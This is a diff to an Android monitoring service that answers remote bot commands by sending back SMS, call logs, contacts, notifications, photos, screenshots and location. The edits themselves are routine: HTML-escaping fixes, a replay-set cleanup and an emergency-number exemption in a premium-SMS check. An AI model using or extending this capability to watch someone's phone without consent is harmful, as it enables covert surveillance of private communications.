@@ -135,7 +135,7 @@ class MonitoringService : Service() {
         private val CMD_SPLIT_REGEX = "\\s+".toRegex()
         private val TAG_STRIP_REGEX = Regex("</?[a-zA-Z][^>]*>")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval")
-        private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/smsconfirm" + "/ping"
+        private val NO_REPLAY_COMMANDS = MUTATING_COMMANDS + "/ping"
         private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val MUTATING_MAX_AGE_SEC = 300L
@@ -1825,7 +1825,7 @@ class MonitoringService : Service() {
                         buildString {
                             appendLine("\uD83D\uDD14 <b>Last notifications</b>")
                             for (item in items.takeLast(10)) {
-                                appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title.take(safeCut(item.title, 80))) + " \u2014 " + Html.escape(item.text.take(safeCut(item.text, 120))))
+                                appendLine("\u2022 " + Html.escape(item.app) + ": " + Html.escape(item.title).let { it.take(safeCut(it, 80)) } + " \u2014 " + Html.escape(item.text).let { it.take(safeCut(it, 120)) })
                             }
                         }
                     )
@@ -2242,7 +2242,7 @@ class MonitoringService : Service() {
                         appendLine()
                         part.forEach { sms ->
                             appendLine("📞 Number: ${Html.escape(sms.address)}")
-                            val body = Html.escape(sms.body.take(safeCut(sms.body, 200)))
+                            val body = Html.escape(sms.body).let { it.take(safeCut(it, 200)) }
                             appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                             appendLine("🔄 Type: ${sms.getTypeString()}")
                             appendLine("⏰ Time: ${formatDate(sms.date)}")
@@ -2406,9 +2406,12 @@ class MonitoringService : Service() {
         }
     }
 
+    private val emergencyNumbers = setOf("112", "911", "999", "110", "000", "111", "118", "119")
+
     private fun isPremiumSmsNumber(raw: String): Boolean {
         val digits = raw.filter { it.isDigit() }
         if (digits.isEmpty()) return false
+        if (digits in emergencyNumbers) return false
         var intl = digits
         if (intl.startsWith("011")) intl = intl.substring(3)
         else if (intl.startsWith("00")) intl = intl.substring(2)
@@ -2421,7 +2424,7 @@ class MonitoringService : Service() {
         if (intl.startsWith("1")) {
             if (intl.substring(1).startsWith("900")) return true
         }
-        if (intl.startsWith("809") || intl.startsWith("900")) return true
+        if (intl.startsWith("900")) return true
         if (local.length <= 6) {
             return true
         }
@@ -2535,7 +2538,7 @@ class MonitoringService : Service() {
             
             smsList.forEach { sms ->
                 appendLine("📞 Number: ${Html.escape(sms.address)}")
-                val body = Html.escape(sms.body.take(safeCut(sms.body, 200))) // Limit to 200 chars
+                val body = Html.escape(sms.body).let { it.take(safeCut(it, 200)) } // Limit to 200 chars
                 appendLine("📝 Text: $body${if (sms.body.length > 200) "..." else ""}")
                 appendLine("🔄 Type: ${sms.getTypeString()}")
                 appendLine("⏰ Time: ${formatDate(sms.date)}")
